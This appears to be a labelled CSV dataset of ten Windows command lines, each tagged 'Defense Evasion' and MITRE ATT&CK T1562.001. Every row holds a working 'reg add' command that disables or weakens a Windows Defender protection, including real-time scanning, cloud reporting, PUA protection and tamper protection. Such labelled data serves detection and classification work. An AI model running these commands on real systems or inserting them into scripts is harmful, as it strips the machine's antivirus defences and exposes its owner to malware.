add2553c-ae6e-4281-a572-0aef34fadfa4,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\" /v \\"DisableScanOnRealtimeEnable\\" /t REG_DWORD /d \\"1\\" /f >NUL 2>nul"'},35,'Defense Evasion','T1562.001 Impair Defenses: Disable or Modify Tools'
33e85c63-47ec-48de-a985-5bc23f4a87fe,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\" /v \\"DisableScriptScanning\\" /t REG_DWORD /d \\"1\\" /f >NUL 2>nul"'},36,'Defense Evasion','T1562.001 Impair Defenses: Disable or Modify Tools'
252eb9eb-eb3d-484f-a5d7-de261d042991,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\\" /v \\"DisableEnhancedNotifications\\" /t REG_DWORD /d \\"1\\" /f >NUL 2>nul"'},37,'Defense Evasion','T1562.001 Impair Defenses: Disable or Modify Tools'
543d8993-4ead-4874-86ec-e17eba5f4e33,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\\" /v \\"DisableBlockAtFirstSeen\\" /t REG_DWORD /d \\"1\\" /f >NUL 2>nul"'},38,'Defense Evasion','T1562.001 Impair Defenses: Disable or Modify Tools'
961e91c2-41a5-442c-8af1-6be05a6eba38,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\\" /v \\"SpynetReporting\\" /t REG_DWORD /d \\"0\\" /f >NUL 2>nul"'},39,'Defense Evasion','T1562.001 Impair Defenses: Disable or Modify Tools'
d2bd274c-69eb-4787-93de-8dbddf2dc4ee,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\\" /v \\"MpEnablePus\\" /t REG_DWORD /d \\"0\\" /f >NUL 2>nul"'},40,'Defense Evasion','T1562.001 Impair Defenses: Disable or Modify Tools'
35c5e790-6d80-4cc0-8cd9-abb99c242c9c,{'subject': 'cmd.exe /c "reg add \\"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\\" /v \\"DisallowExploitProtectionOverride\\" /t REG_DWORD /d \\"0\\" /f >NUL 2>nul"'},41,'Defense Evasion','T1562.001 Impair Defenses: Disable or Modify Tools'
e228f0ff-0651-4fa7-8574-fb8b39069ed3,{'subject': 'cmd.exe /c "reg add \\"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\\" /v \\"TamperProtection\\"  /t REG_DWORD /d \\"0\\" /f >NUL 2>nul"'},42,'Defense Evasion','T1562.001 Impair Defenses: Disable or Modify Tools'
241e310e-febc-4e97-88ef-496f536afed6,{'subject': 'cmd.exe /c "reg add \\"HKLM\\software\\microsoft\\windows defender\\spynet\\" /v \\"SubmitSamplesConsent\\" /t REG_DWORD /d \\"0\\" /f >NUL 2>nul"'},43,'Defense Evasion','T1562.001 Impair Defenses: Disable or Modify Tools'
d27845b4-d432-481d-8f9e-71810764a227,{'subject': 'cmd.exe /c "reg add \\"HKLM\\Software\\Microsoft\\Windows Defender\\" /v \\"PUAProtection\\" /t REG_DWORD /d \\"0\\" /f >NUL 2>nul"'},44,'Defense Evasion','T1562.001 Impair Defenses: Disable or Modify Tools'
